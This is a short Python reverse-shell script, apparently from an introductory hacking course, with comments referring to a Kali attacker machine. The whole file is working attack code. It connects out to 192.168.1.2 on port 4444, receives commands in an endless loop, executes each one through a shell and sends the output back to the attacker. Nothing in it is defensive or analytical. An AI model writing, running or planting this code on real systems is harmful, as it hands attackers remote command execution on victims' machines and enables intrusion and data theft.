#!/usr/bin/env python

import socket
import subprocess

# this function is to return the result of system command
def execute_system_command(command):
	return subprocess.check_output(command, shell=True)

# create a socket object
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# connect to our target
connection.connect(("192.168.1.2", 4444))

# send data. This message will be printed on the kali machine
connection.send("\n[+ Connection established. \n]")

# execute these commands in a loop to be able to send commands continuously
while True:
    # receive data in a variable named command
    command = connection.recv(1024)

    # pass this command variable to a function named execute_system_command
    command_result = execute_system_command(command)

    # send the result to the attacker
    connection.send(command_result)

connection.close()